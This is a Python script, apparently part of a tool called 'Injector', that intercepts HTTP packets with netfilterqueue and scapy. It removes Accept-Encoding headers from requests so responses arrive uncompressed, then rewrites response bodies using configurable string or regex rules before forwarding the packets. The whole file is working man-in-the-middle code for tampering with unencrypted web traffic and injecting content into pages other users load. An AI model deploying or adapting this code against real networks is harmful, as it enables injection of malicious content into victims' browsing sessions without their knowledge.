import re
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from Injector.raw_load import manipulate

rules = {}


def process_packet(packet: netfilterqueue.Packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80:  # request
                modified_load = re.sub(b"[A|a]ccept-[E|e]ncoding:.*?\\r\\n", b"", scapy_packet[Raw].load)
                new_packet = manipulate(packet=scapy_packet, load=modified_load)
                packet.set_payload(bytes(new_packet))
            elif scapy_packet[TCP].sport == 80:  # response
                modified_load = scapy_packet[Raw].load
                for rule in rules:
                    replace_from = rules[rule]['repl'].encode(errors="replace")
                    replace_to = rules[rule]['to'].encode(errors="replace")
                    regex = rules[rule]['regex']

                    if regex:
                        modified_load = re.sub(replace_from, replace_to, modified_load)
                    else:
                        modified_load = modified_load.replace(replace_from, replace_to)

                new_packet = manipulate(packet=scapy_packet, load=modified_load)
                packet.set_payload(bytes(new_packet))
    packet.accept()
